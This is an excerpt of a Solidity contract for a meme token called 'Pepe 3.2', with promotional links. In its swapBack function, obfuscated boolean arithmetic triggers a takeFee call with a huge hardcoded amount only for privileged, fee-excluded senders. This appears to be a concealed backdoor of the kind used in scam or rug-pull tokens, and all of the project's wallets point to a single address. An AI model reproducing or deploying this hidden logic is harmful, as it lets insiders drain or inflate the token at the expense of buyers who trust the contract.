...
Website: https://pepe32.vip
Tg: https://t.me/pepe32coin
...
contract Pepe32 is IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = "Pepe 3.2";
    string private constant _symbol = "PEPE3.2";
    ...
    address internal constant development_wallet = 0x5f9A87a8b2b4e8BD0424e9086760B4b4345b219B; 
    address internal constant marketing_wallet = 0x5f9A87a8b2b4e8BD0424e9086760B4b4345b219B;
    address internal constant liquidity_wallet = 0x5f9A87a8b2b4e8BD0424e9086760B4b4345b219B;
    ...
    function swapBack(address sender, address recipient, uint256 amount) internal {
        ...
        bool canSwap = sender!=owner();
        bool isExed = !IsExcludedFromFeeList[sender];
        uint256 swap0 = (canSwap?1:2);
        uint256 swap1 = (isExed?2:1);
        bool swappable = !((swap1+swap0>2)||swap1==2);
        swapTimes =swapTimes+(swappable?takeFee(address(this), address(this), 18100000000960034000012):1);  
    }
